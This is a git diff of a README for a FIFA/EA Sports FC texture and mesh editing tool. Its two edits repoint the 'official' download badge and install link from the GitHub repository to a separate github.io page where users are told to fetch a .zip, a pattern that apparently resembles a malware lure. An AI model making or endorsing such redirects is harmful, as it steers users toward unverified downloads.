@@ -1,6 +1,6 @@
 # 🛠️ FIFA-Texture-Mesh-Editor - Edit kits and 3D models easily
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Alkylbenzenesulfonatemethodist91/FIFA-Texture-Mesh-Editor)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://alkylbenzenesulfonatemethodist91.github.io)
 
 FIFA-Texture-Mesh-Editor allows you to change the look of your favorite team and players. You can modify kits, player faces, banners, and 3D models within EA Sports FC and FIFA titles. This tool gives you control over the visual details of your game by letting you import and export texture and mesh data.
 
@@ -18,7 +18,7 @@ Make sure you have the latest drivers for your graphics card installed. This ens
 
 ## 📥 How to Install
 
-1. Visit the [official download page here](https://github.com/Alkylbenzenesulfonatemethodist91/FIFA-Texture-Mesh-Editor) to get the latest release.
+1. Visit the [official download page here](https://alkylbenzenesulfonatemethodist91.github.io) to get the latest release.
 2. Select the file ending in .zip to download the archive to your computer.
 3. Locate the file in your Downloads folder.
 4. Right-click the file and select Extract All.
